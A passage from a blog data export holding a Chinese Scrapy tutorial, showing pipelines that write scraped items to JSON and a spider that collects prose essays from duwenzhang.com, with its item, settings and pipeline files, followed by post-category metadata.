class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Define your item pipelines here</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># Don&#x27;t forget to add your pipeline to the ITEM_PIPELINES setting</span></span><br><span class=\"line\"><span class=\"comment\"># See: https://doc.scrapy.org/en/latest/topics/item-pipeline.html</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\"># 第一种方法，没进行json优化，但是看起来简单易操作</span></span><br><span class=\"line\"><span class=\"string\">import json</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">class XiushiPipeline(object):</span></span><br><span class=\"line\"><span class=\"string\">    def __init__(self):</span></span><br><span class=\"line\"><span class=\"string\">        self.fp = open(&#x27;duanzi.json&#x27;, &#x27;w&#x27;, encoding=&#x27;utf-8&#x27;)</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    def open_spider(self, spider):</span></span><br><span class=\"line\"><span class=\"string\">        print(&#x27;爬虫开始了...&#x27;)</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    def process_item(self, item, spider):</span></span><br><span class=\"line\"><span class=\"string\">        item_json = json.dumps(dict(item),  ensure_ascii=False)</span></span><br><span class=\"line\"><span class=\"string\">        self.fp.write(item_json+&#x27;\\n&#x27;)</span></span><br><span class=\"line\"><span class=\"string\">        return item</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    def close_spider(self, spider):</span></span><br><span class=\"line\"><span class=\"string\">        self.fp.close()</span></span><br><span class=\"line\"><span class=\"string\">        print(&quot;爬虫结束了...&quot;)</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"comment\"># 方案二，json优化，结果是每个字典存储在列表中</span></span><br><span class=\"line\"><span class=\"comment\">#        好处是满足json规则，坏处是数据量较大时比较耗内存</span></span><br><span class=\"line\"><span class=\"comment\"># &#x27;&#x27;&#x27; 自我感觉这种方法不咋地 &#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"comment\"># from scrapy.exporters import JsonItemExporter</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># class XiushiPipeline(object):</span></span><br><span class=\"line\"><span class=\"comment\">#     def __init__(self):</span></span><br><span class=\"line\"><span class=\"comment\">#         # 注意此时以二进制形式写入</span></span><br><span class=\"line\"><span class=\"comment\">#         self.fp = open(&#x27;duanzi.json&#x27;, &#x27;wb&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\">#         self.exporter = JsonItemExporter(self.fp, ensure_ascii=False, encoding=&#x27;utf-8&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\">#         self.exporter.start_exporting()</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\">#     def open_spider(self, spider):</span></span><br><span class=\"line\"><span class=\"comment\">#         print(&#x27;爬虫开始了...&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\">#     def process_item(self, item, spider):</span></span><br><span class=\"line\"><span class=\"comment\">#         self.exporter.export_item(item)</span></span><br><span class=\"line\"><span class=\"comment\">#         return item</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\">#     def close_spider(self, spider):</span></span><br><span class=\"line\"><span class=\"comment\">#         self.exporter.finish_exporting()</span></span><br><span class=\"line\"><span class=\"comment\">#         self.fp.close()</span></span><br><span class=\"line\"><span class=\"comment\">#         print(&quot;爬虫结束了...&quot;)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;方案三&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> scrapy.exporters <span class=\"keyword\">import</span> JsonLinesItemExporter</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">XiushiPipeline</span>(<span class=\"params\"><span class=\"built_in\">object</span></span>):</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span>(<span class=\"params\">self</span>):</span></span><br><span class=\"line\">        <span class=\"comment\"># 注意此时以二进制形式写入</span></span><br><span class=\"line\">        self.fp = <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;duanzi.json&#x27;</span>, <span class=\"string\">&#x27;wb&#x27;</span>)</span><br><span class=\"line\">        self.exporter = JsonLinesItemExporter(self.fp, ensure_ascii=<span class=\"literal\">False</span>, encoding=<span class=\"string\">&#x27;utf-8&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">open_spider</span>(<span class=\"params\">self, spider</span>):</span></span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;爬虫开始了...&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">process_item</span>(<span class=\"params\">self, item, spider</span>):</span></span><br><span class=\"line\">        self.exporter.export_item(item)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> item</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">close_spider</span>(<span class=\"params\">self, spider</span>):</span></span><br><span class=\"line\">        self.fp.close()</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;爬虫结束了...&quot;</span>)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>可以在总文件中创建.py文件，代替爬虫开始命令 scrapy crawl xiushiSpider (注意应在爬虫目录下执行该命令)</li>\n</ul>\n</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> scrapy <span class=\"keyword\">import</span> cmdline</span><br><span class=\"line\"></span><br><span class=\"line\">cmdline.execute(<span class=\"string\">&quot;scrapy crawl xiushiSpider&quot;</span>.split())</span><br><span class=\"line\"><span class=\"comment\"># cmdline.execute([&quot;scrapy&quot;, &#x27;crawl&#x27;, &#x27;xiushiSpider&#x27;])</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"爬虫第六天\"><a href=\"#爬虫第六天\" class=\"headerlink\" title=\"爬虫第六天\"></a>爬虫第六天</h1><h3 id=\"scrapy-框架之spider类（示例二-爬取优美散文）\"><a href=\"#scrapy-框架之spider类（示例二-爬取优美散文）\" class=\"headerlink\" title=\"scrapy 框架之spider类（示例二.爬取优美散文）\"></a>scrapy 框架之spider类（示例二.爬取优美散文）</h3><ul>\n<li>item部分</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Define here the models for your scraped items</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># See documentation in:</span></span><br><span class=\"line\"><span class=\"comment\"># https://doc.scrapy.org/en/latest/topics/items.html</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> scrapy</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ProseItem</span>(<span class=\"params\">scrapy.Item</span>):</span></span><br><span class=\"line\">    <span class=\"comment\"># define the fields for your item here like:</span></span><br><span class=\"line\">    <span class=\"comment\"># name = scrapy.Field()</span></span><br><span class=\"line\">    title = scrapy.Field()</span><br><span class=\"line\">    text = scrapy.Field()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<ul>\n<li>settings部分</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Scrapy settings for prose project</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># For simplicity, this file contains only settings considered important or</span></span><br><span class=\"line\"><span class=\"comment\"># commonly used. You can find more settings consulting the documentation:</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\">#     https://doc.scrapy.org/en/latest/topics/settings.html</span></span><br><span class=\"line\"><span class=\"comment\">#     https://doc.scrapy.org/en/latest/topics/downloader-middleware.html</span></span><br><span class=\"line\"><span class=\"comment\">#     https://doc.scrapy.org/en/latest/topics/spider-middleware.html</span></span><br><span class=\"line\"></span><br><span class=\"line\">BOT_NAME = <span class=\"string\">&#x27;prose&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">SPIDER_MODULES = [<span class=\"string\">&#x27;prose.spiders&#x27;</span>]</span><br><span class=\"line\">NEWSPIDER_MODULE = <span class=\"string\">&#x27;prose.spiders&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Crawl responsibly by identifying yourself (and your website) on the user-agent</span></span><br><span class=\"line\"><span class=\"comment\"># USER_AGENT = &#x27;prose (+http://www.yourdomain.com)&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Obey robots.txt rules</span></span><br><span class=\"line\">ROBOTSTXT_OBEY = <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Configure maximum concurrent requests performed by Scrapy (default: 16)</span></span><br><span class=\"line\"><span class=\"comment\"># CONCURRENT_REQUESTS = 32</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Configure a delay for requests for the same website (default: 0)</span></span><br><span class=\"line\"><span class=\"comment\"># See https://doc.scrapy.org/en/latest/topics/settings.html#download-delay</span></span><br><span class=\"line\"><span class=\"comment\"># See also autothrottle settings and docs</span></span><br><span class=\"line\">DOWNLOAD_DELAY = <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"comment\"># The download delay setting will honor only one of:</span></span><br><span class=\"line\"><span class=\"comment\"># CONCURRENT_REQUESTS_PER_DOMAIN = 16</span></span><br><span class=\"line\"><span class=\"comment\"># CONCURRENT_REQUESTS_PER_IP = 16</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Disable cookies (enabled by default)</span></span><br><span class=\"line\"><span class=\"comment\"># COOKIES_ENABLED = False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Disable Telnet Console (enabled by default)</span></span><br><span class=\"line\"><span class=\"comment\"># TELNETCONSOLE_ENABLED = False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Override the default request headers:</span></span><br><span class=\"line\">DEFAULT_REQUEST_HEADERS = &#123;</span><br><span class=\"line\">    <span class=\"string\">&#x27;Accept&#x27;</span>: <span class=\"string\">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;Accept-Language&#x27;</span>: <span class=\"string\">&#x27;en&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;User-Agent&#x27;</span>: <span class=\"string\">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) &#x27;</span></span><br><span class=\"line\">                  <span class=\"string\">&#x27;Chrome/80.0.3987.163 Safari/537.36 &#x27;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Enable or disable spider middlewares</span></span><br><span class=\"line\"><span class=\"comment\"># See https://doc.scrapy.org/en/latest/topics/spider-middleware.html</span></span><br><span class=\"line\"><span class=\"comment\"># SPIDER_MIDDLEWARES = &#123;</span></span><br><span class=\"line\"><span class=\"comment\">#    &#x27;prose.middlewares.ProseSpiderMiddleware&#x27;: 543,</span></span><br><span class=\"line\"><span class=\"comment\"># &#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Enable or disable downloader middlewares</span></span><br><span class=\"line\"><span class=\"comment\"># See https://doc.scrapy.org/en/latest/topics/downloader-middleware.html</span></span><br><span class=\"line\"><span class=\"comment\"># DOWNLOADER_MIDDLEWARES = &#123;</span></span><br><span class=\"line\"><span class=\"comment\">#    &#x27;prose.middlewares.ProseDownloaderMiddleware&#x27;: 543,</span></span><br><span class=\"line\"><span class=\"comment\"># &#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Enable or disable extensions</span></span><br><span class=\"line\"><span class=\"comment\"># See https://doc.scrapy.org/en/latest/topics/extensions.html</span></span><br><span class=\"line\"><span class=\"comment\"># EXTENSIONS = &#123;</span></span><br><span class=\"line\"><span class=\"comment\">#    &#x27;scrapy.extensions.telnet.TelnetConsole&#x27;: None,</span></span><br><span class=\"line\"><span class=\"comment\"># &#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Configure item pipelines</span></span><br><span class=\"line\"><span class=\"comment\"># See https://doc.scrapy.org/en/latest/topics/item-pipeline.html</span></span><br><span class=\"line\">ITEM_PIPELINES = &#123;</span><br><span class=\"line\">   <span class=\"string\">&#x27;prose.pipelines.ProsePipeline&#x27;</span>: <span class=\"number\">300</span>,</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Enable and configure the AutoThrottle extension (disabled by default)</span></span><br><span class=\"line\"><span class=\"comment\"># See https://doc.scrapy.org/en/latest/topics/autothrottle.html</span></span><br><span class=\"line\"><span class=\"comment\"># AUTOTHROTTLE_ENABLED = True</span></span><br><span class=\"line\"><span class=\"comment\"># The initial download delay</span></span><br><span class=\"line\"><span class=\"comment\"># AUTOTHROTTLE_START_DELAY = 5</span></span><br><span class=\"line\"><span class=\"comment\"># The maximum download delay to be set in case of high latencies</span></span><br><span class=\"line\"><span class=\"comment\"># AUTOTHROTTLE_MAX_DELAY = 60</span></span><br><span class=\"line\"><span class=\"comment\"># The average number of requests Scrapy should be sending in parallel to</span></span><br><span class=\"line\"><span class=\"comment\"># each remote server</span></span><br><span class=\"line\"><span class=\"comment\"># AUTOTHROTTLE_TARGET_CONCURRENCY = 1.0</span></span><br><span class=\"line\"><span class=\"comment\"># Enable showing throttling stats for every response received:</span></span><br><span class=\"line\"><span class=\"comment\"># AUTOTHROTTLE_DEBUG = False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Enable and configure HTTP caching (disabled by default)</span></span><br><span class=\"line\"><span class=\"comment\"># See https://doc.scrapy.org/en/latest/topics/downloader-middleware.html#httpcache-middleware-settings</span></span><br><span class=\"line\"><span class=\"comment\"># HTTPCACHE_ENABLED = True</span></span><br><span class=\"line\"><span class=\"comment\"># HTTPCACHE_EXPIRATION_SECS = 0</span></span><br><span class=\"line\"><span class=\"comment\"># HTTPCACHE_DIR = &#x27;httpcache&#x27;</span></span><br><span class=\"line\"><span class=\"comment\"># HTTPCACHE_IGNORE_HTTP_CODES = []</span></span><br><span class=\"line\"><span class=\"comment\"># HTTPCACHE_STORAGE = &#x27;scrapy.extensions.httpcache.FilesystemCacheStorage&#x27;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>proseSpider部分</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> scrapy</span><br><span class=\"line\"><span class=\"keyword\">from</span> prose.items <span class=\"keyword\">import</span> ProseItem</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ProsespiderSpider</span>(<span class=\"params\">scrapy.Spider</span>):</span></span><br><span class=\"line\">    name = <span class=\"string\">&#x27;proseSpider&#x27;</span></span><br><span class=\"line\">    allowed_domains = [<span class=\"string\">&#x27;duwenzhang.com&#x27;</span>]</span><br><span class=\"line\">    start_urls = [<span class=\"string\">&#x27;http://www.duwenzhang.com/wenzhang/shenghuosuibi/&#x27;</span>]</span><br><span class=\"line\">    base_url = <span class=\"string\">&#x27;http://www.duwenzhang.com/wenzhang/shenghuosuibi/&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">parse</span>(<span class=\"params\">self, response</span>):</span></span><br><span class=\"line\">        <span class=\"comment\"># xpath 选择不含有某一属性的标签</span></span><br><span class=\"line\">        url_list = response.xpath(<span class=\"string\">&#x27;//center//tr[2]//td[(@valign) and not(@height)]/table&#x27;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">for</span> it <span class=\"keyword\">in</span> url_list:</span><br><span class=\"line\">            title = it.xpath(<span class=\"string\">&#x27;.//tr[2]//td[@height=&quot;26&quot;]/b/a/text()&#x27;</span>).getall()</span><br><span class=\"line\">            text = it.xpath(<span class=\"string\">&#x27;.//tr[4]/td[@style=&quot;padding-left:3px&quot;]/text()&#x27;</span>).getall()</span><br><span class=\"line\">            text = <span class=\"string\">&quot;&quot;</span>.join(text).strip()</span><br><span class=\"line\">            item = ProseItem(title=title, text=text)</span><br><span class=\"line\">            <span class=\"keyword\">yield</span> item</span><br><span class=\"line\">        <span class=\"comment\"># //a[contains(text(), &quot;百度搜索&quot;)]  【可以部分检索】</span></span><br><span class=\"line\">        <span class=\"comment\"># //a[text()=&quot;文字内容&quot;] 【需要填全】 xpath定位指定文本标签</span></span><br><span class=\"line\">        next_url = response.xpath(<span class=\"string\">&#x27;//tr//a[text()=&quot;下一页&quot;]/@href&#x27;</span>).get()</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> next_url:</span><br><span class=\"line\">            <span class=\"keyword\">return</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">yield</span> scrapy.Request(self.base_url+next_url, callback=self.parse)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<ul>\n<li>piplines 部分</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Define your item pipelines here</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># Don&#x27;t forget to add your pipeline to the ITEM_PIPELINES setting</span></span><br><span class=\"line\"><span class=\"comment\"># See: https://doc.scrapy.org/en/latest/topics/item-pipeline.html</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> json</span><br><span class=\"line\"><span class=\"keyword\">from</span> scrapy.exporters <span class=\"keyword\">import</span> JsonLinesItemExporter</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ProsePipeline</span>(<span class=\"params\"><span class=\"built_in\">object</span></span>):</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span>(<span class=\"params\">self</span>):</span></span><br><span class=\"line\">        self.fp = <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;prose.json&#x27;</span>, <span class=\"string\">&#x27;wb&#x27;</span>)</span><br><span class=\"line\">        self.exporter = JsonLinesItemExporter(self.fp, ensure_ascii=<span class=\"literal\">False</span>,</span><br><span class=\"line\">                                              encoding=<span class=\"string\">&#x27;utf-8&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">open_spider</span>(<span class=\"params\">self, spider</span>):</span></span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;爬虫开始了...&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">process_item</span>(<span class=\"params\">self, item, spider</span>):</span></span><br><span class=\"line\">        self.exporter.export_item(item)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> item</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">close_spider</span>(<span class=\"params\">self, spider</span>):</span></span><br><span class=\"line\">        self.fp.close()</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;爬虫结束了....&#x27;</span>)</span><br></pre></td></tr></table></figure>"}],"PostAsset":[],"PostCategory":[{"post_id":"ckq4nzax400017vvtd36kbzv4","category_id":"ckq4nzaxg00047vvtcm64a53g","_id":"ckq4nzaxt000f7vvt2pjs9z8n"},{"post_id":"ckq4nzaxe00037vvt3u1kddpe","category_id":"ckq4nzaxn000b7vvt5kkp5w86","_id":"ckq4nzaxy000m7vvt4znmgvfj"},{"post_id":"ckq4nzaxj00077vvt80oeco27","category_id":"ckq4nzaxu000g7vvt4r22a2tv","_id":"ckq4nzay0000r7vvt0drtcill"},{"post_id":"ckq4nzaxl00097vvta3w5ahix","category_id":"ckq4nzaxy000n7vvt1sivf7ms","_id":"ckq4nzay8000y7vvtdrw0e0tk"},{"post_id":"ckq4nzay1000u7vvt5qgi95uc","category_id":"ckq4nzaxy000n7vvt1sivf7ms","_id":"ckq4nzaya00127vvthdjk0wtp"},{"post_id":"ckq4nzaxm000a7vvt0s8w07ar","category_id":"ckq4nzay0000s7vvt4zsnhpgr","_id":"ckq4nzaya00137vvtdppt08f6"},{"post_id":"ckq4nzaxo000d7vvtbgllb4a5","category_id":"ckq4nzay900107vvt31l1f999","_id":"ckq4nzayd00197vvt79h09k2y"},{"post_id":"ckq4nzaxt000e7vvtei98cdzo","category_id":"ckq4nzay900107vvt31l1f999","_id":"ckq4nzaye001b7vvt9xwv9u9d"},{"post_id":"ckq4nzaxv000i7vvt94u50vct","category_id":"ckq4nzayc00187vvt8bzmefho","_id":"ckq4nzayf001f7vvta7a4aqm1"},{"post_id":"ckq4nzaxx000k7vvthzhr0ai6","category_id":"ckq4nzaye001c7vvt1podfl5t","_id":"ckq4nzayg001k7vvt2ivj5jp4"},{"post_id":"ckq4nzaxy000p7vvt12nj50zh","category_id":"ckq4nzaye001c7vvt1podfl5t","_id":"ckq4nzayh001n7vvt06dp4352"},{"post_id":"ckq4nzay0000q7vvtfc5ha50e","category_id":"ckq4nzayg001j7vvt68tpewov","_id":"ckq4nzayj001r7vvtacqchqig"},{"post_id":"ckq4nzay2000w7vvt5yoi5qlq","cat